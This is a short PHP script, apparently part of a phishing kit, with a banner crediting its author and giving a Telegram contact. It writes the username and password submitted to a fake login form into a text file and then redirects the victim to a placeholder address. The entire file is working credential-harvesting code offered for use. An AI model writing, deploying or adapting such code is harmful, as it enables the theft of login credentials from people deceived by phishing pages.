<?php

# ____  _ _____         _       ____                       _ _
#/ ___|(_)_   _|__  ___| |__   / ___|  ___  ___ _   _ _ __(_) |_ _   _
#\___ \| | | |/ _ \/ __| '_ \  \___ \ / _ \/ __| | | | '__| | __| | | |
# ___) | | | |  __/ (__| | | |  ___) |  __/ (__| |_| | |  | | |_| |_| |
#|____/|_| |_|\___|\___|_| |_| |____/ \___|\___|\__,_|_|  |_|\__|\__, |
#                                                                |___/
#        By awpsn Contact me via Telegram: https://t.me/awpsn
include 'ip.php';

file_put_contents("usernames.txt", "[EMAIL]: " . $_POST['username'] . " [PASS]: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: <CUSTOM>');
exit();
